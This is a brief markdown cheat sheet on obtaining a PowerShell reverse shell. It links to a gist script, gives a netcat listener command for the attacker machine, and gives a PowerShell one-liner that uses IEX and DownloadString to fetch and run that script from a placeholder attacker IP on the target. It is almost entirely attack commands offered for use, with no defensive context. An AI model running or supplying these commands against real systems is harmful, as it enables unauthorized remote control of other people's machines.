# PowerShell Reverse Shell

1. Download [powershell_reverse_shell.ps1](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1)

2. Start a listener on attacker machine

        nc -nlvp 3001

3. Execute following command on the remote machine to obtain a PowerShell reverse shell
   
        powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP_ADDRESS>:4444/powershell_reverse_shell.ps1')"

## References

* https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1